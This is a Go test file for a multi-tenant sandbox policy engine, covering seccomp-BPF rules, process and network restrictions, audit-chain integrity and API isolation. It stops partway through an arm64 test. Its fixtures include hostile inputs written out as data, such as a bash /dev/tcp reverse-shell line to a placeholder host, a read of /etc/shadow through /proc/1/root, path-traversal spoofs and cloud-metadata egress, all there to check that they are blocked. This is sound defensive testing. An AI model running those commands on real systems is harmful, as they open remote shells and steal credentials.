// SPDX-License-Identifier: Apache-2.0

package sandboxpolicy

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	luxlog "github.com/luxfi/log"
	"github.com/zap-proto/zip"
)

func TestSeccompBPFCompilationAndVMParity(t *testing.T) {
	// Test all 64-bit argument operators (including upper 32-bit word values)
	// plus cross-mode parity between EvalBPF and Engine.Evaluate.
	modes := []EnforcementMode{ModeAuditOnly, ModeEnforceDeny, ModeEnforceSigkill}
	for _, mode := range modes {
		t.Run(string(mode), func(t *testing.T) {
			spec := DefaultVisorSandboxPolicy(mode)
			// Add rules exercising all 64-bit ArgOp variants.
			spec.SyscallRules = append(spec.SyscallRules,
				SyscallRule{
					ID: "sys-arg-ne-ioctl", Priority: 920, Effect: EffectDeny, Action: ModeEnforceDeny,
					SyscallName: "ioctl",
					ArgFilters:  []SyscallArgFilter{{Index: 1, Op: ArgOpNotEqual, Value: 0x0000000100005401}},
				},
				SyscallRule{
					ID: "sys-arg-maskall-prctl", Priority: 920, Effect: EffectDeny, Action: ModeEnforceSigkill,
					SyscallName: "prctl",
					ArgFilters:  []SyscallArgFilter{{Index: 0, Op: ArgOpMaskAll, Value: 0x0000000200000003}},
				},
				SyscallRule{
					ID: "sys-arg-ge-mprotect", Priority: 920, Effect: EffectDeny, Action: ModeEnforceDeny,
					SyscallName: "mprotect",
					ArgFilters:  []SyscallArgFilter{{Index: 2, Op: ArgOpGreaterEq, Value: 0x0000000100000007}},
				},
				SyscallRule{
					ID: "sys-arg-le-fcntl", Priority: 920, Effect: EffectDeny, Action: ModeEnforceDeny,
					SyscallName: "fcntl",
					ArgFilters:  []SyscallArgFilter{{Index: 1, Op: ArgOpLessEq, Value: 0x0000000000000002}},
				},
			)

			eng := NewEngine(EngineConfig{})
			cp, err := eng.UpsertPolicy("org-test", spec)
			if err != nil {
				t.Fatalf("UpsertPolicy(%s): %v", mode, err)
			}
			if _, err := eng.BindSandbox("org-test", "sb-1", cp.Spec.ID); err != nil {
				t.Fatalf("BindSandbox: %v", err)
			}

			// Verify wrong architecture fails closed with SECCOMP_RET_KILL_PROCESS.
			wrongArchRet, err := EvalBPF(cp.BPF, SeccompData{
				NR:   0, // read
				Arch: AuditArchAArch64,
			})
			if err != nil {
				t.Fatalf("EvalBPF wrong arch: %v", err)
			}
			if wrongArchRet != SeccompRetKillProcess {
				t.Fatalf("wrong arch ret = 0x%x, want KILL_PROCESS (0x%x)", wrongArchRet, SeccompRetKillProcess)
			}

			cases := []struct {
				name string
				ev   SyscallEvent
			}{
				{name: "benign_read", ev: SyscallEvent{SyscallName: "read"}},
				{name: "benign_openat", ev: SyscallEvent{SyscallName: "openat"}},
				{name: "escape_ptrace", ev: SyscallEvent{SyscallName: "ptrace"}},
				{name: "escape_bpf", ev: SyscallEvent{SyscallName: "bpf"}},
				{name: "escape_open_by_handle_at", ev: SyscallEvent{SyscallName: "open_by_handle_at"}},
				{name: "clone_benign_thread", ev: SyscallEvent{SyscallName: "clone", Args: [6]uint64{0x00010f00}}},
				{name: "clone_userns_escape", ev: SyscallEvent{SyscallName: "clone", Args: [6]uint64{CloneNewUser}}},
				{name: "socket_af_inet", ev: SyscallEvent{SyscallName: "socket", Args: [6]uint64{2, 1, 0}}},
				{name: "socket_af_packet", ev: SyscallEvent{SyscallName: "socket", Args: [6]uint64{AFPacket, 3, 0}}},
				{name: "ioctl_allowed_exact64", ev: SyscallEvent{SyscallName: "ioctl", Args: [6]uint64{0, 0x0000000100005401}}},
				{name: "ioctl_denied_ne64_hi", ev: SyscallEvent{SyscallName: "ioctl", Args: [6]uint64{0, 0x0000000200005401}}},
				{name: "ioctl_denied_ne64_lo", ev: SyscallEvent{SyscallName: "ioctl", Args: [6]uint64{0, 0x0000000100005402}}},
				{name: "prctl_maskall_hit", ev: SyscallEvent{SyscallName: "prctl", Args: [6]uint64{0x0000000300000007}}},
				{name: "prctl_maskall_miss", ev: SyscallEvent{SyscallName: "prctl", Args: [6]uint64{0x0000000000000003}}},
				{name: "mprotect_ge_hit_hi", ev: SyscallEvent{SyscallName: "mprotect", Args: [6]uint64{0, 4096, 0x0000000200000000}}},
				{name: "mprotect_ge_hit_eq", ev: SyscallEvent{SyscallName: "mprotect", Args: [6]uint64{0, 4096, 0x0000000100000007}}},
				{name: "mprotect_ge_miss", ev: SyscallEvent{SyscallName: "mprotect", Args: [6]uint64{0, 4096, 0x0000000100000006}}},
				{name: "fcntl_le_hit", ev: SyscallEvent{SyscallName: "fcntl", Args: [6]uint64{3, 2}}},
				{name: "fcntl_le_miss", ev: SyscallEvent{SyscallName: "fcntl", Args: [6]uint64{3, 3}}},
				{name: "unlisted_default_deny", ev: SyscallEvent{SyscallNumber: intPtr(400)}},
			}

			for _, tc := range cases {
				res := eng.Evaluate(EvaluationRequest{
					TenantID:  "org-test",
					SandboxID: "sb-1",
					Domain:    DomainSyscall,
					Syscall:   &tc.ev,
				})
				num, _, err := resolveSyscallIdentity(tc.ev.SyscallName, tc.ev.SyscallNumber)
				if err != nil {
					t.Fatalf("resolve %s: %v", tc.name, err)
				}
				ret, err := EvalBPF(cp.BPF, SeccompData{
					NR:   num,
					Arch: AuditArchX86_64,
					Args: tc.ev.Args,
				})
				if err != nil {
					t.Fatalf("EvalBPF(%s): %v", tc.name, err)
				}
				bpfDec, bpfErrno := DecisionFromSeccompRet(ret)
				if bpfDec != res.Decision || bpfErrno != res.Errno {
					t.Errorf("mode=%s case=%s: BPF=(%s, errno=%d) != Engine=(%s, errno=%d) rule=%s",
						mode, tc.name, bpfDec, bpfErrno, res.Decision, res.Errno, res.RuleID)
				}
			}
		})
	}
}

func TestPathNormalizationSymlinkAndPrivEscRefusal(t *testing.T) {
	eng := NewEngine(EngineConfig{})
	cp, err := eng.UpsertPolicy("org-sec", DefaultVisorSandboxPolicy(ModeEnforceSigkill))
	if err != nil {
		t.Fatalf("UpsertPolicy: %v", err)
	}
	if _, err := eng.BindSandbox("org-sec", "sb-1", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	rootUID := uint32(0)
	rootGID := uint32(0)
	noNewPrivsFalse := false

	deniedCases := []struct {
		name string
		ev   ProcessEvent
	}{
		{name: "relative_path", ev: ProcessEvent{BinaryPath: "usr/bin/go"}},
		{name: "nul_byte_path", ev: ProcessEvent{BinaryPath: "/usr/bin/go\x00/evil"}},
		{name: "traversal_to_sudo", ev: ProcessEvent{BinaryPath: "/workspace/../usr/bin/sudo"}},
		{name: "traversal_to_sbin", ev: ProcessEvent{BinaryPath: "/usr/bin/../../sbin/insmod"}},
		{name: "prefix_boundary_spoof", ev: ProcessEvent{BinaryPath: "/usr/bin2/malware"}},
		{name: "tmp_gobuild_boundary_spoof", ev: ProcessEvent{BinaryPath: "/tmp/go-build-evil/dropper"}},
		{name: "symlink_to_nsenter", ev: ProcessEvent{BinaryPath: "/workspace/.bin/helper", ResolvedPath: "/usr/bin/nsenter"}},
		{name: "symlink_to_unlisted", ev: ProcessEvent{BinaryPath: "/workspace/.bin/helper", ResolvedPath: "/etc/evil"}},
		{name: "arg_proc_1_root", ev: ProcessEvent{BinaryPath: "/bin/cat", Args: []string{"cat", "/proc/1/root/etc/shadow"}}},
		{name: "arg_bash_dev_tcp", ev: ProcessEvent{BinaryPath: "/bin/bash", Args: []string{"bash", "-c", "exec 5<>/dev/tcp/198.51.100.1/4444"}}},
		{name: "privesc_setuid", ev: ProcessEvent{BinaryPath: "/usr/bin/env", Setuid: true}},
		{name: "privesc_uid_change", ev: ProcessEvent{BinaryPath: "/usr/bin/env", UID: 1000, NewUID: &rootUID}},
		{name: "privesc_gid_change", ev: ProcessEvent{BinaryPath: "/usr/bin/env", GID: 1000, NewGID: &rootGID}},
		{name: "privesc_cap_added", ev: ProcessEvent{BinaryPath: "/usr/bin/env", CapabilitiesAdded: CapNetRaw}},
		{name: "privesc_effective_sys_admin", ev: ProcessEvent{BinaryPath: "/usr/bin/env", EffectiveCaps: CapSysAdmin}},
		{name: "privesc_no_new_privs_false", ev: ProcessEvent{BinaryPath: "/usr/bin/env", NoNewPrivs: &noNewPrivsFalse}},
	}

	for _, tc := range deniedCases {
		res := eng.Evaluate(EvaluationRequest{
			TenantID:  "org-sec",
			SandboxID: "sb-1",
			Domain:    DomainProcess,
			Process:   &tc.ev,
		})
		if !res.Blocked {
			t.Errorf("case %s was NOT blocked: decision=%s rule=%s", tc.name, res.Decision, res.RuleID)
		}
	}

	// Verify legitimate Go/git executions pass cleanly (with GOTMPDIR=/tmp/go-build).
	noNewPrivsTrue := true
	allowed := []ProcessEvent{
		{BinaryPath: "/usr/local/go/bin/go", Args: []string{"go", "test", "./..."}, UID: 1000, GID: 1000, NoNewPrivs: &noNewPrivsTrue},
		{BinaryPath: "/usr/bin/git", Args: []string{"git", "status"}, UID: 1000, GID: 1000},
		{BinaryPath: "/tmp/go-build/go-build12345/b001/pkg.test", ResolvedPath: "/tmp/go-build/go-build12345/b001/pkg.test", UID: 1000, GID: 1000},
	}
	for _, ev := range allowed {
		res := eng.Evaluate(EvaluationRequest{
			TenantID:  "org-sec",
			SandboxID: "sb-1",
			Domain:    DomainProcess,
			Process:   &ev,
		})
		if res.Decision != DecisionAllow {
			t.Errorf("benign exec %s rejected: decision=%s rule=%s reason=%s", ev.BinaryPath, res.Decision, res.RuleID, res.Reason)
		}
	}
}

func TestNetworkCIDRAndIPv4MappedIPv6Normalization(t *testing.T) {
	eng := NewEngine(EngineConfig{})
	cp, err := eng.UpsertPolicy("org-net", DefaultVisorSandboxPolicy(ModeEnforceSigkill))
	if err != nil {
		t.Fatalf("UpsertPolicy: %v", err)
	}
	if _, err := eng.BindSandbox("org-net", "sb-1", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	cases := []struct {
		name     string
		ev       NetworkEvent
		wantDec  Decision
		wantRule string
	}{
		{
			name:     "imds_v4",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "169.254.169.254", DestPort: 80},
			wantDec:  DecisionSigkill,
			wantRule: "net-deny-imds-v4",
		},
		{
			name:     "imds_ipv4_mapped_ipv6_bypass_attempt",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "::ffff:169.254.169.254", DestPort: 80},
			wantDec:  DecisionSigkill,
			wantRule: "net-deny-imds-v4",
		},
		{
			name:     "imds_ipv4_mapped_ipv6_on_443",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "::ffff:169.254.169.254", DestPort: 443},
			wantDec:  DecisionSigkill,
			wantRule: "net-deny-imds-v4",
		},
		{
			name:     "imds_aws_ipv6",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "fd00:ec2::254", DestPort: 80},
			wantDec:  DecisionSigkill,
			wantRule: "net-deny-imds-v6",
		},
		{
			name:     "rfc1918_ipv4_mapped_ipv6",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "::ffff:10.96.0.1", DestPort: 443},
			wantDec:  DecisionDeny,
			wantRule: "net-deny-rfc1918-10",
		},
		{
			name:     "loopback_docker_ipv4_mapped_ipv6",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "::ffff:127.0.0.1", DestPort: 2375},
			wantDec:  DecisionSigkill,
			wantRule: "net-deny-loopback-docker",
		},
		{
			name:     "reverse_shell_4444",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "198.51.100.42", DestPort: 4444},
			wantDec:  DecisionSigkill,
			wantRule: "default_deny_network",
		},
		{
			name:     "public_https_allowed",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "140.82.112.4", DestPort: 443},
			wantDec:  DecisionAllow,
			wantRule: "net-allow-https-v4",
		},
		{
			name:     "public_ipv6_https_allowed",
			ev:       NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "2606:4700:4700::1111", DestPort: 443},
			wantDec:  DecisionAllow,
			wantRule: "net-allow-https-v6",
		},
		{
			name:     "loopback_ephemeral_httptest_allowed",
			ev:       NetworkEvent{Direction: NetDirBind, Protocol: "tcp", DestIP: "127.0.0.1", DestPort: 45123},
			wantDec:  DecisionAllow,
			wantRule: "net-allow-loopback-ephemeral-v4",
		},
	}

	for _, tc := range cases {
		res := eng.Evaluate(EvaluationRequest{
			TenantID:  "org-net",
			SandboxID: "sb-1",
			Domain:    DomainNetwork,
			Network:   &tc.ev,
		})
		if res.Decision != tc.wantDec || res.RuleID != tc.wantRule {
			t.Errorf("case %s: got (%s, %s), want (%s, %s)", tc.name, res.Decision, res.RuleID, tc.wantDec, tc.wantRule)
		}
	}
}

func TestPolicyConflictAndFailClosedDefaults(t *testing.T) {
	eng := NewEngine(EngineConfig{})

	// 1. Unbound sandbox must fail closed.
	unbound := eng.Evaluate(EvaluationRequest{
		TenantID:  "org-fc",
		SandboxID: "sb-unbound",
		Domain:    DomainSyscall,
		Syscall:   &SyscallEvent{SyscallName: "read"},
	})
	if !unbound.Blocked || unbound.RuleID != "fail_closed_no_policy" {
		t.Fatalf("unbound sandbox did not fail closed: %+v", unbound)
	}

	// 2. Install valid v1 policy, then attempt conflicting v2 policy — v1 must remain intact.
	valid := DefaultVisorSandboxPolicy(ModeEnforceDeny)
	valid.ID = "pol-1"
	valid.Version = 1
	if _, err := eng.UpsertPolicy("org-fc", valid); err != nil {
		t.Fatalf("UpsertPolicy v1: %v", err)
	}

	conflicting := TracingPolicy{
		ID:      "pol-1",
		Version: 2,
		Mode:    ModeEnforceDeny,
		SyscallRules: []SyscallRule{
			{ID: "r1", Priority: 500, Effect: EffectAllow, SyscallName: "ptrace"},
			{ID: "r2", Priority: 500, Effect: EffectDeny, SyscallName: "ptrace"},
		},
	}
	if _, err := eng.UpsertPolicy("org-fc", conflicting); !errors.Is(err, ErrPolicyConflict) {
		t.Fatalf("expected ErrPolicyConflict, got: %v", err)
	}
	got, err := eng.GetPolicy("org-fc", "pol-1")
	if err != nil || got.Spec.Version != 1 {
		t.Fatalf("existing valid policy corrupted after failed update: got=%v err=%v", got, err)
	}
}

func TestAuditRingBoundedMemoryHashChainAndTamperDetection(t *testing.T) {
	ring := NewTenantAuditRing(64, RingOverwriteOldest)
	now := time.Date(2026, 11, 26, 18, 0, 0, 0, time.UTC)

	for i := 0; i < 250; i++ {
		_, ok := ring.Append(AuditEvent{
			TenantID:      "org-audit",
			SandboxID:     "sb-1",
			PolicyID:      "p1",
			PolicyVersion: 1,
			Timestamp:     now.Add(time.Duration(i) * time.Millisecond),
			Domain:        DomainSyscall,
			RuleID:        "sys-deny-ptrace",
			Action:        DecisionSigkill,
			Errno:         SignalSIGKILL,
			Subject:       "ptrace(101)",
		})
		if !ok {
			t.Fatalf("overwrite ring dropped event %d", i)
		}
	}

	stats := ring.Stats()
	if stats.Retained != 64 || stats.Evicted != 186 || stats.LastSeq != 250 {
		t.Fatalf("unexpected ring stats: %+v", stats)
	}
	evs := ring.Snapshot("", 0)
	if len(evs) != 64 {
		t.Fatalf("snapshot len = %d, want 64", len(evs))
	}
	if err := VerifyAuditChain(evs); err != nil {
		t.Fatalf("VerifyAuditChain failed on wrapped ring: %v", err)
	}

	// Tamper with one event and confirm cryptographic detection.
	tampered := append([]AuditEvent(nil), evs...)
	tampered[10].Action = DecisionAllow
	if err := VerifyAuditChain(tampered); err == nil {
		t.Fatal("VerifyAuditChain failed to detect payload tampering")
	}

	// Test drop-newest backpressure ring mode.
	bpRing := NewTenantAuditRing(16, RingDropNewest)
	for i := 0; i < 40; i++ {
		bpRing.Append(AuditEvent{
			TenantID:  "org-bp",
			SandboxID: "sb-1",
			Timestamp: now,
			Domain:    DomainSyscall,
			Action:    DecisionAllow,
		})
	}
	bpStats := bpRing.Stats()
	if bpStats.Retained != 16 || bpStats.Dropped != 24 || bpStats.TotalEmitted != 40 {
		t.Fatalf("unexpected backpressure stats: %+v", bpStats)
	}
	if drained := bpRing.Drain(8); drained != 8 {
		t.Fatalf("drained = %d, want 8", drained)
	}
	if _, ok := bpRing.Append(AuditEvent{TenantID: "org-bp", SandboxID: "sb-1", Timestamp: now, Domain: DomainSyscall, Action: DecisionAllow}); !ok {
		t.Fatal("expected append to succeed after Drain")
	}
}

func TestIndexedEqualsUnindexedEquivalence(t *testing.T) {
	spec := DefaultVisorSandboxPolicy(ModeEnforceSigkill)
	// Add 100 extra rules across all three domains to exercise multi-bucket lookup.
	for i := 0; i < 40; i++ {
		spec.ProcessRules = append(spec.ProcessRules, ProcessRule{
			ID:           fmt.Sprintf("extra-proc-%03d", i),
			Priority:     200 + (i % 50),
			Effect:       EffectDeny,
			Action:       ModeEnforceDeny,
			BinaryPrefix: fmt.Sprintf("/opt/forbidden-%03d", i),
		})
		spec.NetworkRules = append(spec.NetworkRules, NetworkRule{
			ID:        fmt.Sprintf("extra-net-%03d", i),
			Priority:  300 + (i % 50),
			Effect:    EffectDeny,
			Action:    ModeEnforceDeny,
			Direction: NetDirEgress,
			CIDR:      fmt.Sprintf("203.0.113.%d/32", i+1),
		})
	}
	eng := NewEngine(EngineConfig{})
	cp, err := eng.UpsertPolicy("org-eq", spec)
	if err != nil {
		t.Fatalf("UpsertPolicy: %v", err)
	}
	if _, err := eng.BindSandbox("org-eq", "sb-1", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	reqs := []EvaluationRequest{
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainSyscall, Syscall: &SyscallEvent{SyscallName: "ptrace"}},
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainSyscall, Syscall: &SyscallEvent{SyscallName: "read"}},
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainProcess, Process: &ProcessEvent{BinaryPath: "/opt/forbidden-015/bin/x"}},
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainProcess, Process: &ProcessEvent{BinaryPath: "/usr/bin/git"}},
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainNetwork, Network: &NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "203.0.113.20", DestPort: 443}},
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainNetwork, Network: &NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "::ffff:169.254.169.254", DestPort: 80}},
		{TenantID: "org-eq", SandboxID: "sb-1", Domain: DomainNetwork, Network: &NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "140.82.112.4", DestPort: 443}},
	}
	for i, req := range reqs {
		req.Unindexed = false
		idxRes := eng.Evaluate(req)
		req.Unindexed = true
		linRes := eng.Evaluate(req)
		if idxRes.Decision != linRes.Decision || idxRes.RuleID != linRes.RuleID || idxRes.Errno != linRes.Errno {
			t.Errorf("req[%d]: indexed=(%s,%s,%d) != unindexed=(%s,%s,%d)",
				i, idxRes.Decision, idxRes.RuleID, idxRes.Errno, linRes.Decision, linRes.RuleID, linRes.Errno)
		}
	}
}

func TestStrictTenantIsolationAndConcurrencyRaceFree(t *testing.T) {
	eng := NewEngine(EngineConfig{AuditRingCapacity: 512})
	tenants := []string{"org-a", "org-b", "org-c", "org-d"}
	for _, ten := range tenants {
		spec := DefaultVisorSandboxPolicy(ModeEnforceSigkill)
		spec.ID = "pol-" + ten
		if _, err := eng.UpsertPolicy(ten, spec); err != nil {
			t.Fatalf("UpsertPolicy(%s): %v", ten, err)
		}
		if _, err := eng.BindSandbox(ten, "sb-shared-name", spec.ID); err != nil {
			t.Fatalf("BindSandbox(%s): %v", ten, err)
		}
	}

	var wg sync.WaitGroup
	for g := 0; g < 8; g++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ten := tenants[id%len(tenants)]
			for i := 0; i < 60; i++ {
				if i%3 == 0 {
					eng.Evaluate(EvaluationRequest{
						TenantID: ten, SandboxID: "sb-shared-name", Domain: DomainSyscall,
						Syscall: &SyscallEvent{SyscallName: "ptrace"},
					})
				} else if i%3 == 1 {
					eng.Evaluate(EvaluationRequest{
						TenantID: ten, SandboxID: "sb-shared-name", Domain: DomainNetwork,
						Network: &NetworkEvent{Direction: NetDirEgress, Protocol: "tcp", DestIP: "169.254.169.254", DestPort: 80},
					})
				} else {
					eng.Evaluate(EvaluationRequest{
						TenantID: ten, SandboxID: "sb-shared-name", Domain: DomainProcess,
						Process: &ProcessEvent{BinaryPath: "/usr/bin/git"},
					})
				}
				_ = eng.TenantStats(ten)
			}
		}(g)
	}
	wg.Wait()

	for _, ten := range tenants {
		evs, _ := eng.AuditEvents(ten, "", 0)
		if err := VerifyAuditChain(evs); err != nil {
			t.Fatalf("tenant %s audit chain invalid: %v", ten, err)
		}
		for _, ev := range evs {
			if ev.TenantID != ten {
				t.Fatalf("cross-tenant audit leak: tenant %s saw event for %s", ten, ev.TenantID)
			}
		}
	}
}

func mountTestApp(t *testing.T) *zip.App {
	t.Helper()
	app := zip.New(zip.Config{Logger: luxlog.New("test")})
	orgFrom := func(ctx context.Context) (string, bool) {
		c := zip.CallerOf(ctx)
		if c.User == "" || c.Org == "" {
			return "", false
		}
		return c.Org, true
	}
	acting := func(ctx context.Context) (string, error) {
		c := zip.CallerOf(ctx)
		if c.User == "" {
			return "", zip.ErrUnauthorized("a validated principal is required")
		}
		if c.Org == "" {
			return "", zip.ErrForbidden("X-Org-Id required")
		}
		return c.Org, nil
	}
	if err := Mount(app, Deps{
		Log:    luxlog.New("test"),
		Org:    orgFrom,
		Acting: acting,
	}); err != nil {
		t.Fatalf("Mount: %v", err)
	}
	return app
}

func TestEveryOperationAndFieldIsDescribed(t *testing.T) {
	raw, err := json.Marshal(mountTestApp(t).OpenAPISpec())
	if err != nil {
		t.Fatalf("marshal OpenAPISpec: %v", err)
	}
	var doc map[string]any
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("unmarshal OpenAPISpec: %v", err)
	}

	paths, _ := doc["paths"].(map[string]any)
	served := 0
	for p, item := range paths {
		if !strings.HasPrefix(p, "/v1/sandboxpolicy") {
			continue
		}
		for method, opRaw := range item.(map[string]any) {
			served++
			op, _ := opRaw.(map[string]any)
			if desc, _ := op["description"].(string); strings.TrimSpace(desc) == "" {
				t.Errorf("%s %s has no description — run: go generate ./apps/sandboxpolicy", strings.ToUpper(method), p)
			}
		}
	}
	if served != 8 {
		t.Fatalf("expected 8 /v1/sandboxpolicy operations, got %d", served)
	}

	schemas, _ := doc["components"].(map[string]any)["schemas"].(map[string]any)
	var bare []string
	for name, raw := range schemas {
		props, _ := raw.(map[string]any)["properties"].(map[string]any)
		for field, praw := range props {
			if desc, _ := praw.(map[string]any)["description"].(string); strings.TrimSpace(desc) == "" {
				bare = append(bare, name+"."+field)
			}
		}
	}
	if len(bare) > 0 {
		sort.Strings(bare)
		t.Errorf("published propert(ies) without description: %s", strings.Join(bare, ", "))
	}
}

func TestHTTPWireSecurityIsolationAndQueryHijackImmunity(t *testing.T) {
	app := mountTestApp(t)

	doReq := func(method, target, org string, body any) (int, []byte) {
		var buf bytes.Buffer
		if body != nil {
			if err := json.NewEncoder(&buf).Encode(body); err != nil {
				t.Fatalf("encode body: %v", err)
			}
		}
		req := httptest.NewRequest(method, target, &buf)
		if body != nil {
			req.Header.Set("Content-Type", "application/json")
		}
		if org != "" {
			req.Header.Set("X-Org-Id", org)
			req.Header.Set("X-User-Id", "u_"+org)
		}
		resp, err := app.Test(req, zip.TestConfig{Timeout: 30 * time.Second, FailOnTimeout: true})
		if err != nil {
			t.Fatalf("%s %s: %v", method, target, err)
		}
		defer func() { _ = resp.Body.Close() }()
		var out bytes.Buffer
		if _, err := out.ReadFrom(resp.Body); err != nil {
			t.Fatalf("read response: %v", err)
		}
		return resp.StatusCode, out.Bytes()
	}

	// 1. Health endpoint is public and leaks zero tenant names.
	code, _ := doReq(http.MethodGet, "/v1/sandboxpolicy/health", "", nil)
	if code != http.StatusOK {
		t.Fatalf("health status = %d, want 200", code)
	}

	// 2. Unauthenticated requests to protected endpoints return 401.
	for _, ep := range []struct{ m, p string }{
		{http.MethodGet, "/v1/sandboxpolicy/policies"},
		{http.MethodPost, "/v1/sandboxpolicy/policies"},
		{http.MethodPost, "/v1/sandboxpolicy/evaluate"},
		{http.MethodGet, "/v1/sandboxpolicy/audit"},
		{http.MethodGet, "/v1/sandboxpolicy/metrics"},
	} {
		c, _ := doReq(ep.m, ep.p, "", nil)
		if c != http.StatusUnauthorized {
			t.Errorf("%s %s without auth = %d, want 401", ep.m, ep.p, c)
		}
	}

	// 3. Query-hijack immunity: query params mode=audit_only&id=hijacked must NOT
	// override JSON body fields carrying `url:"-"`.
	pol := DefaultVisorSandboxPolicy(ModeEnforceSigkill)
	pol.ID = "visor-strict"
	code, raw := doReq(http.MethodPost, "/v1/sandboxpolicy/policies?id=hijacked&mode=audit_only", "org-alpha", pol)
	if code != http.StatusCreated {
		t.Fatalf("upsertPolicy status = %d body=%s", code, string(raw))
	}
	var sum PolicySummary
	if err := json.Unmarshal(raw, &sum); err != nil {
		t.Fatalf("decode PolicySummary: %v", err)
	}
	if sum.ID != "visor-strict" || sum.Mode != ModeEnforceSigkill {
		t.Fatalf("query-hijack succeeded! got id=%q mode=%q", sum.ID, sum.Mode)
	}
	if sum.BPFInsnCount == 0 || sum.BPFDigest == "" {
		t.Fatalf("expected compiled seccomp-BPF summary, got %+v", sum)
	}

	// 4. Bind sandbox in org-alpha (also test query-hijack on policyId).
	code, raw = doReq(http.MethodPost, "/v1/sandboxpolicy/sandboxes/sb-1/bind?policyId=hijacked", "org-alpha", map[string]string{
		"policyId": "visor-strict",
	})
	if code != http.StatusOK {
		t.Fatalf("bindSandbox status = %d body=%s", code, string(raw))
	}

	// 5. Evaluate escape attempt in org-alpha (with query-hijack attempt).
	code, raw = doReq(http.MethodPost, "/v1/sandboxpolicy/evaluate?sandboxId=hijacked&domain=process", "org-alpha", map[string]any{
		"sandboxId": "sb-1",
		"domain":    "network",
		"network": map[string]any{
			"direction": "egress",
			"protocol":  "tcp",
			"destIp":    "::ffff:169.254.169.254",
			"destPort":  80,
		},
	})
	if code != http.StatusOK {
		t.Fatalf("evaluate status = %d body=%s", code, string(raw))
	}
	var dec DecisionResult
	if err := json.Unmarshal(raw, &dec); err != nil {
		t.Fatalf("decode DecisionResult: %v", err)
	}
	if dec.Decision != DecisionSigkill || !dec.Blocked || !dec.AuditRecorded {
		t.Fatalf("unexpected evaluation decision: %+v", dec)
	}

	// 6. Strict cross-org isolation: org-beta cannot read org-alpha's policy,
	// cannot bind org-alpha's policy, fails closed on sb-1, and sees 0 of org-alpha's audit events.
	if c, _ := doReq(http.MethodGet, "/v1/sandboxpolicy/policies/visor-strict", "org-beta", nil); c != http.StatusNotFound {
		t.Fatalf("cross-org getPolicy = %d, want 404", c)
	}
	if c, _ := doReq(http.MethodPost, "/v1/sandboxpolicy/sandboxes/sb-1/bind", "org-beta", map[string]string{"policyId": "visor-strict"}); c != http.StatusNotFound {
		t.Fatalf("cross-org bindSandbox = %d, want 404", c)
	}
	code, raw = doReq(http.MethodGet, "/v1/sandboxpolicy/audit", "org-beta", nil)
	if code != http.StatusOK {
		t.Fatalf("org-beta audit status = %d", code)
	}
	var betaAudit auditListOut
	if err := json.Unmarshal(raw, &betaAudit); err != nil {
		t.Fatalf("decode org-beta audit: %v", err)
	}
	if len(betaAudit.Events) != 0 {
		t.Fatalf("cross-org audit leak! org-beta saw %d events", len(betaAudit.Events))
	}

	// 7. org-alpha audit log shows valid hash-chained SIGKILL event.
	code, raw = doReq(http.MethodGet, "/v1/sandboxpolicy/audit", "org-alpha", nil)
	if code != http.StatusOK {
		t.Fatalf("org-alpha audit status = %d", code)
	}
	var alphaAudit auditListOut
	if err := json.Unmarshal(raw, &alphaAudit); err != nil {
		t.Fatalf("decode org-alpha audit: %v", err)
	}
	if len(alphaAudit.Events) != 1 || !alphaAudit.ChainValid || alphaAudit.Events[0].Action != DecisionSigkill {
		t.Fatalf("unexpected org-alpha audit: %+v", alphaAudit)
	}
}

// Regression test for Codex Finding #1: arm64 policies must resolve syscall identities
// using the arm64 (asm-generic) syscall table throughout compilation and evaluation.
func TestArm64SyscallResolutionAndBPFParity(t *testing.T) {
	eng := NewEngine(EngineConfig{})
	spec := DefaultVisorSandboxPolicyForArch(ModeEnforceSigkill, "arm64")
	cp, err := eng.UpsertPolicy("org-arm64", spec)
	if err != nil {
		t.Fatalf("UpsertPolicy(arm64): %v", err)
	}
	if cp.BPF.AuditArch != AuditArchAArch64 {
		t.Fatalf("arm64 AuditArch = 0x%x, want 0x%x", cp.BPF.AuditArch, AuditArchAArch64)
	}
	if _, err := eng.BindSandbox("org-arm64", "sb-arm64", cp.Spec.ID); err != nil {
		t.Fatalf("BindSandbox: %v", err)
	}

	// Native arm64 setns(268) MUST be killed (not allowed via x86_64 fchmodat=268),
	// while native arm64 write(64), read(63), fchmodat(53), sched_getaffinity(123),
	// and rseq(293) MUST be allowed, and clone3(435) MUST return ENOSYS.
	cases := []struct {
		name      string
		num       uint32
		sysName   string
		wantDec   Decision
		wantErrno int
	}{
		{name: "arm64_setns_268", num: 268, sysName: "setns", wantDec: DecisionSigkill, wantErrno: SignalSIGKILL},
		{name: "arm64_write_64", num: 64, sysName: "write", wantDec: DecisionAllow, wantErrno: 0},
		{name: "arm64_read_63", num: 63, sysName: "read", wantDec: DecisionAllow, wantErrno: 0},
		{name: "arm64_fchmodat_53", num: 53, sysName: "fchmodat", wantDec: DecisionAllow, wantErrno: 0},
